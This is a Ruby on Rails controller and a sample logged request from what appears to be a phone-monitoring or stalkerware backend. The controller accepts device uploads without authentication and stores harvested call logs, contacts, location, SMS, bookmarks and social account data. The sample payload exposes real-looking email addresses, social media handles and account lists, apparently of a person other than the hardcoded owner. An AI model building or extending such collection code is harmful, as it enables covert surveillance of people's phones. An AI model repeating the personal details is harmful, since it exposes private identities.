class UploadController < ApplicationController

	def index

    #head :ok and return if params[:device].empty? || params[:email].empty? || params[:type].empty? || params[:data].empty?

    params[:email] = "maxiperezc@gmail.com"

    user = User.find_by(email: params[:email])
    user ||= User.create!(:email => params[:email], :digest => "digest")

    device = Device.find_by(number: params[:device])
    device ||= Device.create!(number: params[:device], name: params[:device], user_id: user.id, finger: params[:finger])

    transport(device)

    head :ok
  end

  def transport(device)
    data = JSON.parse(params[:data])

    case params[:type]
    
    when "accounts"
      Account.store(data, device)
    when "calls"
      Call.store(data, device)
    when "contacts"
      Contact.store(data, device)
    when "location"
      Location.store(data, device)
    when "bookmarks"
      Bookmark.store(data, device)
    when "sms"
      Sms.store(data, device)
    when "social"
      Social.store(data, device)
    when "profile"
      Profile.store(data, device)
    end

  end

end



{ 
  "device"=>"b6a44655f91ba54",
  "email"=>"",
  "finger"=>"samsung/ja3gub/ja3g:4.4.2/KOT49H/I9500UBUFNC1:user/release-keys",
  "type"=>"accounts",
  "data"=>"[{\"id\":\"826961576\",\"name\":\"maxiperezc@gmail.com\",\"type\":\"com.osp.app.signin\"},
  {\"id\":\"-664652368\",\"name\":\"maxiperezc@gmail.com\",\"type\":\"com.google\"},
  {\"id\":\"-668119760\",\"name\":\"perezcotomagali.mpc@gmail.com\",\"type\":\"com.google\"},
  {\"id\":\"930907941\",\"name\":\"maxiperezc\",\"type\":\"com.twitter.android.auth.login\"},
  {\"id\":\"-1281866288\",\"name\":\"magaperezcoto\",\"type\":\"com.twitter.android.auth.login\"},
  {\"id\":\"303994846\",\"name\":\"WhatsApp\",\"type\":\"com.whatsapp\"},
  {\"id\":\"1544288047\",\"name\":\"1376571542\",\"type\":\"com.sec.android.app.sns3.facebook\"},
  {\"id\":\"-1530214698\",\"name\":\"maggali.f@hotmail.com\",\"type\":\"com.facebook.auth.login\"},
  {\"id\":\"254218185\",\"name\":\"BBM Groups\",\"type\":\"com.bbm.account\"},
  {\"id\":\"-1767685378\",\"name\":\"Sync\",\"type\":\"com.shazam.android\"},
  {\"id\":\"1122903757\",\"name\":\"Magaperezcoto 13\",\"type\":\"com.soundcloud.android.account\"},
  {\"id\":\"2059165179\",\"name\":\"magaliperezcoto@hotmail.com\",\"type\":\"com.dropbox.android.account\"},
  {\"id\":\"-1745526085\",\"name\":\"magaliperezcoto@hotmail.com\",\"type\":\"com.android.exchange\"},
  {\"id\":\"58090789\",\"name\":\"maggali.f@hotmail.com\",\"type\":\"com.etermax.games.account\"}]", 
  "action"=>"index", 
  "controller"=>"upload"
}
